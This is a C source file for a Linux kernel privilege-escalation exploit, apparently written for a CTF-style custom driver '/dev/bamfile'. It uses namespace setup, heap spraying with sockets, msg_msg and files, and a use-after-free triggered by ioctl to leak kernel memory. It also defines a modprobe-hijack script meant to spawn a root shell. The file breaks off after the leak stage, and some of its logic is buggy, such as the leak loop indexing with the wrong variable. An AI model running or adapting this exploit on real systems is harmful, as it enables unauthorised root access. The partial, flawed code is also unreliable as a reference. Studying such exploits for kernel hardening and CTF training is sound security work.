#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <signal.h>

#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>


#define SKBUF_SPRAY 128
#define PIPE_SPRAY SKBUF_SPRAY + 32
#define FILE_SPRAY 10000
#define SPRAY_MSG 4096

#define SPRAY_QDISC 0x20000

#define MASK 0xfffffffff0000000
#define PAGE_SIZE 4096
#define PAGE_SHIFT 12
#define PHYSICAL_ALIGN 0x200000

#define MODPROBE_SCRIPT "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"
#define errout(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); } while(0)


/* msg_msg helpers */
#include <sys/ipc.h>
#include <sys/msg.h>

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x43

typedef struct
{
    long mtype;
    char mtext[0];
} msg_t;

struct list_head
{
    struct list_head *next, *prev;
};

struct msg_msg
{
    struct list_head m_list;
    long m_type;
    size_t m_ts; /* message text size */
    uint64_t next;
    uint64_t security;
    uint8_t text[0];
};

/* pipe_buffer helpers */
struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};


uint8_t isheap(uint64_t ptr)
{
    int high = ptr >> 44;
    if (high >= 0xffff8 && high < 0xfffff)
    {
        return 1;
    }
    return 0;
}


void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t *set = malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(set), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

bool check_modprobe(char *expected)
{
    char buf[32];
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
    {
        perror("[-] open(modprobe)");
    }
    read(fd, buf, 32);
    if (!strcmp(buf, expected))
    {
        close(fd);
        return true;
    }
    close(fd);
    return false;
}

static bool is_kernel_base(unsigned char *addr)
{
    // thanks lau :)

    // get-sig kernel_runtime_1
    if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
        memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
        return true;

    // get-sig kernel_runtime_2
    if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
        memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
        memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
        memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
        memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
        memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
        memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
        memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
        memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
        memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
        memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
        return true;

    return false;
}


bool trigger_modprobe(int status_fd)
{
    char *argv = NULL;
    int fd = memfd_create("", MFD_CLOEXEC);
    int status = 0;

    write(fd, "\xff\xff\xff\xff", 4);
    fexecve(fd, &argv, &argv);
    close(fd);

    read(status_fd, &status, 1);
    if (status)
    {
        return true;
    }
    return false;
}

int exploit(int argc, char **argv)
{

    struct rlimit rlim;

    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);

    rlim.rlim_cur = rlim.rlim_max = (200 << 20);
    setrlimit(RLIMIT_AS, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 32 << 20;
    setrlimit(RLIMIT_MEMLOCK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 136 << 20;
    setrlimit(RLIMIT_FSIZE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 1 << 20;
    setrlimit(RLIMIT_STACK, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
    rlim.rlim_cur = rlim.rlim_max = 0x8000;
    setrlimit(RLIMIT_NOFILE, &rlim);

    if(getrlimit(RLIMIT_NOFILE, &rlim)==-1){
        perror("[X] limit error");
        return EXIT_FAILURE;
    }

    printf("[+] Old limits -> soft limit= %ld \t"
          " hard limit= %ld \n", rlim.rlim_cur, rlim.rlim_max);

    // Setup I/O for shell
    int stdin_fd = dup(STDIN_FILENO);
    int stdout_fd = dup(STDOUT_FILENO);

    // Setup fake modprobe
    int modprobe_fd = memfd_create("", MFD_CLOEXEC);
    int status_fd = memfd_create("", 0);

    int sock[SKBUF_SPRAY][2];
    puts("[+] prepare skbuff");
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock[i]) < 0)
        {
            perror("[-] socketpair");
            return -1;
        }
    }

    int msqid[PAGE_SIZE];
    for (int i = 0; i < SPRAY_MSG ; i++){
        msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if(msqid[i]==-1){
            errout("[X] msgget:");
        }
    }


    int fd = open("/dev/bamfile", O_RDWR);
    if(fd==-1){
      errout("[X] bamfile");
    }

    /* prepare msg_msg spray */
    
    puts("[*] spray 10000 file");
    int fd_spray[FILE_SPRAY];
    for(int i=0; i < FILE_SPRAY;i++){
          fd_spray[i] = open("/", O_RDONLY);
          if(fd_spray[i] ==-1){
              errout("[X] fd_spray");
          }
    }

    puts("[*] trigger UAF file");
    int uaf_fd = fd_spray[FILE_SPRAY - 1] + 1;

    if (ioctl(fd, 0, 0xdeadbeef) == 0){
        errout("[X] UAF file failed");
    }

    puts("[*] free 44 files");
    //close(fd);
    for(int i=0; i < 1000; i++){
        close(fd_spray[FILE_SPRAY/2-500+i]);
    }
    sleep(1);

    char alloc_msg[0x2000] = {};
    msg_t *msg = (msg_t*)alloc_msg;
    msg->mtype = 1;
    printf("[*] spray 800 msg_msg (kmalloc-cg-512)\n");
    for(int i=0; i < SPRAY_MSG; i++){
        memset(msg->mtext,0x41,0x1800);
        if(msgsnd(msqid[i], (void*)msg, 0x1000+0x200-0x30-0x8,0) == -1){
            errout("msg spray");
        }
    }
   close(fd);

    int fake_qid = -1;
    int real_qid = -1;
    int found = false;
    char leak[0x2000];
    int leak_offset;

    puts("[*] check victim qid");
    for(int i=0; i < SPRAY_MSG; i++){
        if(msgrcv(msqid[i], leak, 0x1400-0x30-0x8,0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY)==-1){
            errout("[X] msgrcv(leak)");          
        }

        for(int j=0; j < 0x1200-0x30-0x8-0x10; j+=8){
            if(*(uint64_t*)(leak + i) != 0x4141414141414141){
                printf("[+] we got leak at %d\n" ,j);
                leak_offset = j;
                printf("[+] leak: 0x%lx\n" , *(uint64_t*)(leak+j));
                real_qid = *(uint64_t*)(leak+i);
                fake_qid = i;
                found = true;
            }

            if(found){
                break;
            }
        }

    }

    if(!real_qid || !fake_qid){
        errout("[X] leak failed");
    }      

    return EXIT_SUCCESS;

}

int main(int argc, char *argv[])
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    srand(time(NULL));

    if (!fork())
    {
        unshare_setup(getuid(), getgid());
        set_cpu_affinity(0, 0);
        exploit(argc, argv);
    }

    while (1)
        sleep(1);
    return 0;    
}
